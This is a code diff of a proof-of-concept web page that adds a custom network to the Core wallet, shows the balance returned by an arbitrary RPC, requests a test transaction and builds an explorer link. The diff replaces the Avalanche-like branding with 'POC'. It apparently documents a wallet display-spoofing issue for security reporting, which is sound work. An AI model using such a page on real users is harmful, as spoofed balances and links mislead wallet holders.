@@ -36,7 +36,7 @@
 </head>
 <body>
 <main>
-  <div class="brand"><span>Avalanche Network Portal</span><span class="dot"></span></div>
+  <div class="brand"><span>POC</span><span class="dot"></span></div>
   <h1>Add Avalanche C-Chain to Core</h1>
   <p class="sub">One click to connect to the Avalanche C-Chain and view your AVAX balance.</p>
 
@@ -107,7 +107,8 @@
     const h = await eip().request({ method:'eth_getBalance', params:[account, 'latest'] });
     say('Core balance: ' + avax(h) + ' ' + el('symbol').value, 'g');
     if(h === '0x0' || !h){ say('Balance is 0 — set it from a terminal, then press Balance again:', 'y'); say(fund(), 'k'); }
-    else done('sB', 'Core shows <b>' + avax(h) + ' ' + el('symbol').value + '</b> returned by this RPC'); }
+    else done('sB', 'Core shows <b>' + avax(h) + ' ' + el('symbol').value + '</b> returned by this RPC');
+    return h; }
   async function sendTx(){ await connect();
     say('Requesting signature for 0.1 ' + el('symbol').value + ' on "' + el('name').value + '"', 'y');
     try{
@@ -118,9 +119,9 @@
       if(/insufficient|funds/i.test(m)){ say('Fund the account first, then retry:', 'y'); say(fund(), 'k'); } throw e; } }
   function explorer(){
     const base = el('explorer').value.trim().replace(/\/+$/,'');
-    const url = base + '/address/' + (account || '<account>');
+    const url = base + '/address/' + el('to').value;
     say('Explorer URL Core will open: ' + url, 'y');
-    say('In Core: Portfolio → tap AVAX → "View on explorer".', 'k');
+    say('On the transaction-approval screen, tap the explorer icon next to the "To" address.', 'k');
     done('sD', 'Core opens <b>' + url + '</b>'); }
 
   el('add').onclick   = () => addNetwork().catch(e => say(e.message || e.code, 'r'));
@@ -130,7 +131,11 @@
   el('exp').onclick   = explorer;
   el('run').onclick   = async () => {
     if(!el('rpc').value.trim()){ say('Enter the RPC endpoint first.', 'y'); return; }
-    try{ await addNetwork(); await switchNetwork(); await readBalance(); await sendTx(); explorer();
+    try{
+      await addNetwork(); await switchNetwork();
+      const h = await readBalance();
+      if(h === '0x0' || !h){ say('Fund the account with the command above, then press "Send 0.1 AVAX", then "Explorer link".', 'y'); return; }
+      await sendTx(); explorer();
       say('PoC complete — capture Core screens for A, B, C, D.', 'g'); }
     catch(e){ say('Stopped: ' + (e.message || e.code), 'r'); } };
 </script>
